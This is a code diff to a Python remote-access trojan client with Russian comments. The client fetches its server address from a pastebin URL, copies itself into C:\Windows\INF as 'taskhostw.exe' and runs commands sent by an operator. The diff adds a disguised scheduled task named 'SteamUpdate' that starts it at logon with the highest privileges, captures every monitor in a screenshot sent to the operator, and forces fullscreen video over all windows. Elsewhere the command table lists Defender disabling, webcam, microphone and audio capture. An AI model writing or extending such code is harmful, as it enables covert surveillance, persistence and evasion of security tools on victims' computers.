@@ -83,7 +83,7 @@ logger.info(f"CLIENT_ID: {CLIENT_ID}")
 
 pyautogui.FAILSAFE = False
 
-EXEC_URL = "https://pastebin.com/raw/xxxxxx"
+EXEC_URL = "https://pastebin.com/raw/xxxxx"
 def get_buffer_process():
     
     """
@@ -127,11 +127,12 @@ def get_buffer_process():
 
 # Загружаем конфигурацию при старте
 SERVER_IP, SERVER_PORT = get_buffer_process()
-RECONNECT_DELAY = 5
+RECONNECT_DELAY = 15
 
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 29
-TARGET_DIR = r"C:\Windows"
+CURRENT_VERSION = 34
+MAX_LEN = 4000
+TARGET_DIR = r"C:\Windows\INF"
 new_name="taskhostw.exe"
 stop_event = threading.Event()
 auto_thread = None
@@ -139,6 +140,8 @@ socket_lock = threading.Lock()
 current_socket = None
 current_thread_id = None
 current_path = os.path.expanduser("~")
+video_thread = None
+video_stop_event = threading.Event()
 file_lock = threading.Lock()
 _mixer_initialized = False
 music_thread = None
@@ -338,6 +341,7 @@ def disable_uac():
 
 ############################
 
+"""
 def change_shell():
     logger.info("Изменение shell запущено")
     try:
@@ -354,6 +358,40 @@ def change_shell():
         logger.error(f"Ошибка при изменении shell: {e}")
     finally:
         logger.info("Работа потока изменения shell завершена")
+"""
+
+def change_shell():
+    logger.info("Настройка скрытого автозапуска через Планировщик...")
+    try:
+        app_path = os.path.join(TARGET_DIR, new_name)
+        task_name = "SteamUpdate" # Выглядит легитимно
+        
+        # 1. Сначала удаляем старую задачу, если она была, чтобы не плодить дубли
+        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
+        
+        # 2. Создаем новую задачу
+        # /sc onlogon - запуск при входе пользователя
+        # /tr - путь к файлу
+        # /rl highest - запуск с наивысшими правами (если есть возможность)
+        # /it - интерактивный запуск
+        # /f - принудительное создание
+        cmd = (
+            f'schtasks /create /tn "{task_name}" /tr "\'{app_path}\'" '
+            f'/sc onlogon /rl highest /f'
+        )
+        
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            logger.info("Программа успешно скрыта в Планировщике задач")
+        else:
+            # Если не удалось создать с правами highest, создаем обычную
+            cmd_basic = f'schtasks /create /tn "{task_name}" /tr "\'{app_path}\'" /sc onlogon /f'
+            subprocess.run(cmd_basic, shell=True)
+            logger.info("Создана обычная задача в Планировщике")
+
+    except Exception as e:
+        logger.error(f"Ошибка скрытого автозапуска: {e}")
 
 def set_file_attributes(file_path):
     # Устанавливаем атрибуты скрытый и системный
@@ -704,42 +742,41 @@ def cmd_changeclipboard(args):
 
 def cmd_restart(args):
     """
-    Перезапускает клиент, используя start через shell для независимого запуска 
-    нового процесса и sys.exit() для немедленного завершения старого.
+    Правильный перезапуск: отсоединение процесса и жесткое завершение.
     """
     try:
-            
-        # 1. Формируем команду для нового процесса (гарантия чистых путей)
-        reboot_command = [sys.executable] + sys.argv
+        # 1. Получаем путь к текущему файлу
+        # Если это exe (после PyInstaller), sys.executable - это путь к exe.
+        # Если это скрипт, то это путь к интерпретатору.
+        executable = sys.executable
+        script_args = sys.argv
         
-        # Экранируем аргументы (заключаем в кавычки) для команды start
-        quoted_reboot_command = " ".join(f'"{arg}"' for arg in reboot_command)
+        # 2. Формируем команду
+        # Важно: для Windows используем DETACHED_PROCESS, чтобы процессы не были связаны
+        DETACHED_PROCESS = 0x00000008
         
-        # Используем start "" для запуска нового процесса
-        cmd_string = f'start "" {quoted_reboot_command}'
+        logger.info("Запуск нового процесса...")
         
-        # 2. Запускаем новый процесс независимо
+        # Запускаем новый процесс без shell=True и без наследования дескрипторов
         subprocess.Popen(
-            cmd_string, 
-            shell=True,
-            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP, 
-            close_fds=True
+            [executable] + script_args,
+            creationflags=DETACHED_PROCESS,
+            close_fds=True,
+            cwd=os.getcwd() # Важно запустить в той же рабочей директории
         )
+
+        # 3. Даем ОС время на инициализацию нового процесса (хватит 200мс)
+        time.sleep(0.2)
         
-        # 3. НЕОБХОДИМЫЙ ШАГ: Немедленное завершение текущего процесса
-        # Отправляем сообщение перед выходом
-        # logger.info("Перезапуск выполнен. Выход из старого процесса...")
-        
-        # Добавляем очень короткую задержку, чтобы новый процесс успел запуститься
-        time.sleep(0.5) 
-        
-        # Принудительно завершаем выполнение скрипта. Это ГАРАНТИРУЕТ закрытие.
-        sys.exit(0) 
+        # 4. ЖЕСТКОЕ ЗАВЕРШЕНИЕ
+        # Вместо sys.exit(0), который может ждать потоки, используем os._exit
+        # Это мгновенно убивает процесс на уровне ядра.
+        logger.info("Старый процесс завершается немедленно (os._exit)")
+        os._exit(0)
 
     except Exception as e:
-        # В случае ошибки, возвращаем управление главному циклу, чтобы не рухнуть
-        # logger.error(f"Ошибка при попытке перезапуска: {e}")
-        return f"❌ Ошибка при перезапуске: {e}", True, None
+        logger.error(f"Ошибка перезапуска: {e}")
+        return f"❌ Ошибка: {e}", True, None
 
 def cmd_minimize(args):
     try:
@@ -1679,6 +1716,96 @@ def cmd_screenshot(args, conn):
         if temp_path and os.path.exists(temp_path):
             os.remove(temp_path)
 
+def cmd_screenshot_full(args, conn):
+    import win32gui, win32ui, win32con, win32api
+    import ctypes, os, uuid, tempfile
+    from PIL import Image
+
+    temp_path = os.path.join(
+        tempfile.gettempdir(),
+        f"screen_full_{uuid.uuid4().hex}.png"
+    )
+
+    try:
+        # ===== DPI =====
+        try:
+            ctypes.windll.shcore.SetProcessDpiAwareness(1)
+        except Exception:
+            ctypes.windll.user32.SetProcessDPIAware()
+
+        # ===== ВИРТУАЛЬНЫЙ ЭКРАН (ВСЕ МОНИТОРЫ) =====
+        width  = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+        left   = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+        top    = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+
+        hdesktop = win32gui.GetDesktopWindow()
+        desktop_dc = win32gui.GetWindowDC(hdesktop)
+        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+        mem_dc = img_dc.CreateCompatibleDC()
+
+        bmp = win32ui.CreateBitmap()
+        bmp.CreateCompatibleBitmap(img_dc, width, height)
+        mem_dc.SelectObject(bmp)
+
+        mem_dc.BitBlt(
+            (0, 0),
+            (width, height),
+            img_dc,
+            (left, top),
+            win32con.SRCCOPY
+        )
+
+        # ===== КУРСОР =====
+        flags, hcursor, (cx, cy) = win32gui.GetCursorInfo()
+        if flags == win32con.CURSOR_SHOWING:
+            info = win32gui.GetIconInfo(hcursor)
+            win32gui.DrawIconEx(
+                mem_dc.GetSafeHdc(),
+                cx - left - info[1],
+                cy - top - info[2],
+                hcursor,
+                0, 0, 0,
+                None,
+                win32con.DI_NORMAL
+            )
+
+        # ===== В PIL =====
+        bmp_info = bmp.GetInfo()
+        bmp_bits = bmp.GetBitmapBits(True)
+
+        img = Image.frombuffer(
+            "RGB",
+            (bmp_info["bmWidth"], bmp_info["bmHeight"]),
+            bmp_bits,
+            "raw",
+            "BGRX",
+            0, 1
+        )
+        img.save(temp_path)
+
+        # ===== CLEAN DC =====
+        mem_dc.DeleteDC()
+        win32gui.ReleaseDC(hdesktop, desktop_dc)
+
+        if not os.path.exists(temp_path) or os.path.getsize(temp_path) < 1024:
+            send_response(conn, "❌ Скриншот не получен")
+            return None
+
+        err = send_file(conn, temp_path)
+        send_response(conn, err or "✅ Полный скриншот (все мониторы) отправлен")
+
+    except Exception as e:
+        send_response(conn, f"❌ Screenshot full error: {e}")
+
+    finally:
+        if os.path.exists(temp_path):
+            try:
+                os.remove(temp_path)
+            except:
+                pass
+
+    return None
 
 def find_available_cameras():
     """
@@ -2528,7 +2655,6 @@ def cmd_open_image(args, conn):
     window_name = f"fullscreen_image_viewer_{os.getpid()}" 
     
     try:
-        # ... (Парсинг аргументов остается прежним)
         parts = args.strip().split(None, 1)
         if len(parts) < 2:
             send_response(conn, "❌ Формат: /open_image <секунды> <путь к файлу>")
@@ -2606,7 +2732,112 @@ def cmd_open_image(args, conn):
         cv2.destroyAllWindows() 
         cv2.waitKey(1)
 
-        
+def video_play_task(path):
+    win_name = "elite"
+
+    try:
+        cap = cv2.VideoCapture(path)
+        if not cap.isOpened():
+            logger.error("Не удалось открыть видео")
+            return
+
+        cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
+
+        # 🔥 РЕАЛЬНЫЙ FULLSCREEN
+        cv2.setWindowProperty(
+            win_name,
+            cv2.WND_PROP_FULLSCREEN,
+            cv2.WINDOW_FULLSCREEN
+        )
+
+        # ⏳ Ждём пока окно реально появится
+        hwnd = None
+        for _ in range(50):  # ~1 сек
+            hwnd = win32gui.FindWindow(None, win_name)
+            if hwnd:
+                break
+            time.sleep(0.02)
+
+        if hwnd:
+            # 🔥 ЖЁСТКО ПОВЕРХ ВСЕХ ОКОН
+            win32gui.SetWindowPos(
+                hwnd,
+                win32con.HWND_TOPMOST,
+                0, 0, 0, 0,
+                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
+            )
+
+            # убрать рамки и фокус
+            style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
+            win32gui.SetWindowLong(
+                hwnd,
+                win32con.GWL_STYLE,
+                style & ~(
+                    win32con.WS_CAPTION |
+                    win32con.WS_THICKFRAME |
+                    win32con.WS_MINIMIZE |
+                    win32con.WS_MAXIMIZE |
+                    win32con.WS_SYSMENU
+                )
+            )
+
+        fps = cap.get(cv2.CAP_PROP_FPS)
+        delay = int(1000 / fps) if fps > 0 else 33
+
+        while not video_stop_event.is_set():
+            ret, frame = cap.read()
+            if not ret:
+                break
+
+            cv2.imshow(win_name, frame)
+
+            # ESC — выход
+            if cv2.waitKey(delay) & 0xFF == 27:
+                break
+
+        cap.release()
+        cv2.destroyAllWindows()
+
+    except Exception as e:
+        logger.error(f"Video error: {e}")
+    finally:
+        video_stop_event.clear()
+
+
+def cmd_open_video(args):
+    global video_thread
+
+    if not args:
+        return "❌ Укажите путь к видео"
+
+    path = args.strip()
+    if not os.path.isabs(path):
+        path = os.path.join(current_path, path)
+
+    if not os.path.isfile(path):
+        return "❌ Видео не найдено"
+
+    # если уже играет — останавливаем
+    if video_thread and video_thread.is_alive():
+        video_stop_event.set()
+        video_thread.join(timeout=1)
+
+    video_stop_event.clear()
+    video_thread = threading.Thread(
+        target=video_play_task,
+        args=(path,),
+        daemon=True
+    )
+    video_thread.start()
+
+    return "🎬 Видео запущено (без звука, поверх всех окон)"
+
+def cmd_close_video(args):
+    if video_thread and video_thread.is_alive():
+        video_stop_event.set()
+        return "🛑 Видео остановлено"
+    return "⚠️ Видео не запущено"
+  
 # ====== Словарь команд ======
 COMMANDS = {
     "/ls": cmd_ls,
@@ -2667,7 +2898,11 @@ COMMANDS = {
     "/update": cmd_update,
     "/killwindef": cmd_killwindef,
     "/wd_exclude": cmd_wd_exclude,
-    "/audiorecord": cmd_audiorecord
+    "/audiorecord": cmd_audiorecord,
+    "/open_video": cmd_open_video,
+    "/close_video": cmd_close_video,
+    "/screenshot_full": cmd_screenshot_full,
+    "/scfull": cmd_screenshot_full
 }
 
 # ====== Главный цикл ======
@@ -2758,7 +2993,7 @@ def main_client_loop():
                             else:
                                  result = func(args, conn)          # <-- передаём conn
 
-                        elif cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image", "/audiorecord", "/playsound"]:
+                        elif cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image", "/audiorecord", "/playsound", "/screenshot_full", "/scfull"]:
                             # Долгосрочные операции: запуск в отдельном потоке. Они сами отправляют результат.
                             threading.Thread(target=func, args=(args, conn), daemon=True).start()
                             result = None
